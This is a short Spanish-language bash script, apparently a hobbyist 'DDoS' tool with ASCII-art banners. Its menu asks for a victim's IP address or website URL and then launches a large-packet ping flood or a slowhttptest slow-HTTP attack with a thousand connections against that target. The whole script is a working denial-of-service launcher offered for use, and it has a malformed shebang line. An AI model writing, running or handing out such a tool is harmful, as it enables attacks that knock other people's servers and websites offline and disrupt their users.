#/bin/bash/
clear
#banner

# ____  ____  ____         ____ _   _  ___  ____ _____ 
#|  _ \|___ /|  _ \       / ___| | | |/ _ \/ ___|_   _|
#| |_) | |_ \| | | |_____| |  _| |_| | | | \___ \ | |  
#|  _ < ___) | |_| |_____| |_| |  _  | |_| |___) || |  
#|_| \_\____/|____/       \____|_| |_|\___/|____/ |_|  
                                   

sleep 1
clear
echo "
 ____  ____       ____    _   _      _                      _    
|  _ \|  _ \  ___/ ___|  | \ | | ___| |___      _____  _ __| | __
| | | | | | |/ _ \___ \  |  \| |/ _ \ __\ \ /\ / / _ \| '__| |/ /
| |_| | |_| | (_) |__) | | |\  |  __/ |_ \ V  V / (_) | |  |   < 
|____/|____/ \___/____/  |_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\

"
sleep 1
#menu

echo "[1] DDoS IP"
echo "[2] DDoS WEB"
echo "[3] Salir"
read i 
if [ $i = 1 ]; then
	sleep 1
	clear
	echo "Coloca la ip de la victima" 
	read ip
	clear
	ping -s 16024 -i 0.200 $ip
elif [ $i = 2 ]; then
	sleep 1
	clear
	echo "Coloca la url de la web"
	echo "Poner HTTP HTTPS"
	read url
	slowhttptest -c 1000 -i 110 -r 200 -s 819 -u $url -x 10 -p 3
elif [ $i = 3 ]; then
	exit 0

fi
